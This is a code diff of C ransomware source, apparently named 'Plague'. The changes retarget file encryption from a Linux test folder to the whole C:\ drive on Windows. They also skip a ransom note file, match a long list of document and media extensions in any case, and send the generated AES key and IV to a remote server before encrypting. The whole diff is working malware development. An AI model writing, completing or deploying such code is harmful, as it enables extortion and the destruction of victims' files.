@@ -33,24 +33,9 @@ char *str_concat(int nb_arg, ...) {
     return path;
 }
 
-void print_file_content(const char *path) {
-    unsigned char buf[128];
-    unsigned int size;
-    FILE *fd;
-
-    if (!(fd = fopen(path, "r")))
-        handleError();
-    while ((size = fread(buf, 1, sizeof(buf), fd)) > 0)
-    {
-        BIO_dump_fp (stdout, (const char *)buf, (int)size);
-    }
-    fclose(fd);
-}
-
-
 int in_whitelist(char *str)
 {
-  char *whitelist[] = {"..", ".", 0};
+  char *whitelist[] = {"..", ".", "README-PLAGUE.txt", "Windows", 0}; //TODO revoir le dossier windows a ignorer
 
   for (int i = 0; whitelist[i] ; i++)
     if (strcmp(whitelist[i], str) == 0)
@@ -58,8 +43,37 @@ int in_whitelist(char *str)
   return 0;
 }
 
+char *uppercase(char *str)
+{
+    char *upper;
+    int i = 0;
+
+    if (!(upper = malloc(sizeof(char *) * strlen(str))))
+        return NULL;
+    while(str[i])
+    {
+        upper[i] = (char)toupper((int)(str[i]));
+        i++;
+    }
+    upper[i] = 0;
+    return upper;
+}
+
+int endWith(const char *str, const char *suffix)
+{
+    if (!str || !suffix)
+        return 0;
+    size_t lenstr = strlen(str);
+    size_t lensuffix = strlen(suffix);
+    if (lensuffix >  lenstr)
+        return 0;
+    return strncmp(str + lenstr - lensuffix, suffix, lensuffix) == 0;
+}
+
 int check_ext(const char *path)
 {
+    char *upper;
+
     // List of extentions files to encrypt.
     char *ext[] = {".docx", ".ppam", ".sti", ".vcd", ".3gp", ".sch", ".myd", ".wb2", ".docb", ".potx", ".sldx", ".jpeg",
                   ".mp4", ".dch", ".frm", ".slk", ".docm", ".potm", ".sldm", ".jpg", ".mov", ".dip", ".odb", ".dif",
@@ -79,8 +93,15 @@ int check_ext(const char *path)
     //TODO Remplacer par un endWith()
     for (int i = 0; ext[i]; i++)
     {
-        if (strstr(path, ext[i]))
+        upper = uppercase(ext[i]);
+        if (endWith(path, ext[i]) || endWith(path, upper))
+        {
+            if (upper)
+                free(upper);
             return 1;
+        }
+        if (upper)
+            free(upper);
     }
     return 0;
 }
@@ -98,15 +119,14 @@ void apply_for_all(const char *path, void (*fct)(unsigned char [], unsigned char
     {
       if (in_whitelist(dir->d_name))
         continue;
-      //str = str_concat(3, path, "\\", dir->d_name);               // Windows
-      str = str_concat(3, path, "/", dir->d_name);          // Linux
+      str = str_concat(3, path, "\\", dir->d_name);               // Windows
         if ((stat(str, &s) == 0) && (s.st_mode & S_IFDIR))
-        apply_for_all(str, fct, key, iv);
-        else
-          fct(key, iv, str);
+            apply_for_all(str, fct, key, iv);
+        else {
+            fct(key, iv, str);
+        }
       free(str);
       str = NULL;
-      //printf("%s\n", dir->d_name);
     }
     closedir(d);
   }
@@ -116,11 +136,11 @@ int main()
 {
     unsigned char key[KEY_SIZE];             // A 256 bit key
     unsigned char iv[IV_SIZE];              // A 128 bit IV
-    //char *path = strdup("C:\\");                                  // Windows
-    char *path = strdup("/home/kali/CLionProjects/Plague/test"); // Linux
+    char *path = strdup("C:\\");                                  // Windows
     char *encoded_key, *encoded_iv;
     int check = 0;
 
+    //FreeConsole();
     // TODO rand_seed() to set unpredictable random
     //RAND_seed(&buf, 10);
     if (!RAND_bytes(key, KEY_SIZE))    // Key random generation
@@ -128,13 +148,12 @@ int main()
     if (!RAND_bytes(iv, KEY_SIZE))     //  IV random generation
         handleError();
 
-    // BIO_dump_fp (stdout, (const char *)key, (int)KEY_SIZE);      // DEBUG
-
-    // Send key and IV to server
     // Encode in hexa
     encoded_key = encode_hex(key, KEY_SIZE);
     encoded_iv = encode_hex(iv, IV_SIZE);
-    check = send_key(encoded_key, encoded_iv, get_hostname());
+
+    // Send key and IV to server
+    check = send_key(encoded_key, encoded_iv);
     if (check == 1)
         return 0;
 
@@ -145,6 +164,5 @@ int main()
     memset(key, 0, KEY_SIZE);                                   // Erase memory where was store the key
     memset(encoded_key, 0, KEY_SIZE * 2);
     free(encoded_key);
-    //system("PAUSE");                                             // Windows
     return 0;
 }
